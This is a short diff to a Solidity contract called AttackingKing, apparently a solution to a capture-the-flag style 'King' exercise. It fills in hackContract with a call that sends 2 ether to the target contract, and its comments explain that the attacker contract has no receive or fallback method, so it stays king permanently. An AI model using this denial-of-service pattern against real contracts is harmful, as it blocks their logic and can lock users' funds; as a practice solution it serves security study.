@@ -11,6 +11,12 @@ contract AttackingKing {
     }
 
     function hackContract() external {
-        // Code me!
+        // In this scenario, we simply need to become the king and
+        // we've successfully broken the King contract.
+        // Since there is no `receive` or `fallback` method,
+        // this contract is not able to receive ETH via regular transfers,
+        // so it reverts any time someone attempts to do so.
+        (bool success, ) = address(contractAddress).call{value: 2 ether}("");
+        require(success);
     }
 }
